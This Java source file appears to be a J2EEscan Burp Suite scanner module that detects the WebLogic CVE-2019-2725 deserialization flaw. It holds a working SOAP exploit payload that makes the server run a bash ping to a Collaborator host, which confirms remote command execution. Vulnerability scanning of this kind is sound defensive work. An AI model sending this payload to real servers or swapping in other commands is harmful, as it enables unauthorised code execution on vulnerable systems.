
package burp.j2ee.issues.impl;

import burp.IBurpCollaboratorClientContext;
import burp.IBurpCollaboratorInteraction;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.annotation.RunOnlyOnce;
import burp.j2ee.issues.IModule;
import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.LinkedHashSet;
import java.util.List;

/**
 *
 * Weblogic Deserialization Vulnerability - Remote Command Execution /_async/AsyncResponseService
 *
 *
 * References:
 *  - https://www.oracle.com/security-alerts/alert-cve-2019-2725.html
 *  - https://nvd.nist.gov/vuln/detail/CVE-2019-2725
 *  - https://blog.rapid7.com/2019/05/03/weblogic-deserialization-remote-code-execution-vulnerability-cve-2019-2725-what-you-need-to-know/
 *
 */
public class WeblogicCVE20192725 implements IModule {

    private static final String TITLE = "Weblogic - AsyncResponseService Remote Command Execution";
    private static final String DESCRIPTION = "J2EEscan identified a remote command execution the path <code> /_async/AsyncResponseService</code><br />"
            + "An insecure deserialization vulnerability has been reported in Oracle WebLogic server. <br />"
            + "User input is validated to ensure that tags that result in arbitrary method and constructor calls are blacklisted.<br /> "
            + "The &lt;class&gt; tag is not correctly blacklisted. This allows the attacker to initiate any class with arbitrary constructor arguments.<br />"
            + "Attackers leverage this to achieve arbitrary code execution, by initiating a class object which accepts a byte array as a constructor argument. "
            + "<br />Upon initialization, the crafted malicious serialized byte array gets deserialized causing arbitrary remote code execution.<br /><br />"
            + "<b>References:</b>"
            + "<ul><li>https://www.oracle.com/security-alerts/alert-cve-2019-2725.html</li></ul>";

    private static final String REMEDY = "Update the Weblogic componenent with the last security patches provided by Oracle";

    // List of host and port system already tested
    private static LinkedHashSet hs = new LinkedHashSet();
    private PrintWriter stderr;

    private static final List<String> ASYNC_PATHS = Arrays.asList(
            "/_async/AsyncResponseService"
    );

    @RunOnlyOnce
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        List<IScanIssue> issues = new ArrayList<>();

        IExtensionHelpers helpers = callbacks.getHelpers();
        stderr = new PrintWriter(callbacks.getStderr(), true);
        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);

        URL url = reqInfo.getUrl();
        String host = url.getHost();
        int port = url.getPort();

        String system = host.concat(Integer.toString(port));

        // System not yet tested for this vulnerability
        if (!hs.contains(system)) {

            hs.add(system);

            String protocol = url.getProtocol();

            String serializedRce = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">   "
                    + "<soapenv:Header>"
                    + "<wsa:Action>ONRaJntRjNYBc3MJW2JC</wsa:Action>"
                    + "<wsa:RelatesTo>42PlWZ15ODi1hQ3pQ5Ol</wsa:RelatesTo>"
                    + "<work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">"
                    + "<void class=\"java.lang.ProcessBuilder\">"
                    + "<array class=\"java.lang.String\" length=\"3\">"
                    + "<void index=\"0\">"
                    + "<string>/bin/bash</string>"
                    + "</void>"
                    + "<void index=\"1\">"
                    + "<string>-c</string>"
                    + "</void>"
                    + "<void index=\"2\">"
                    + "<string>ping -c 3 %s</string>"
                    + "</void>"
                    + "</array>"
                    + "<void method=\"start\"/></void>"
                    + "</work:WorkContext>"
                    + "</soapenv:Header>"
                    + "<soapenv:Body>"
                    + "<asy:onAsyncDelivery/>"
                    + "</soapenv:Body></soapenv:Envelope>";

            // Collaborator context
            IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
            String currentCollaboratorPayload = collaboratorContext.generatePayload(true);

            for (String ASYNC_PATH : ASYNC_PATHS) {

                List<String> headers = new ArrayList<>();
                headers.add(String.format("POST %s HTTP/1.1", ASYNC_PATH));
                headers.add("Host: " + url.getHost() + ":" + url.getPort());
                headers.add("Content-Type: text/xml");
                headers.add("Cookie: ADMINCONSOLESESSION=pTsBVcsdVx2g20mxPJyyPDvqTwQmQDtw7R541DGJGGXD2qh4rDBJ!1211788216");

                String finalPayload = String.format(serializedRce, currentCollaboratorPayload);

                byte[] serializedMessage = helpers.buildHttpMessage(headers, finalPayload.getBytes());
                IHttpRequestResponse resp = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), serializedMessage);

                // Poll Burp Collaborator for remote interaction
                List<IBurpCollaboratorInteraction> collaboratorInteractions = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);

                if (!collaboratorInteractions.isEmpty()) {
                    issues.add(new CustomScanIssue(
                            baseRequestResponse.getHttpService(),
                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                            resp,
                            TITLE,
                            DESCRIPTION,
                            REMEDY,
                            Risk.High,
                            Confidence.Certain));

                    return issues;

                }

            }
        }

        return issues;
    }

}
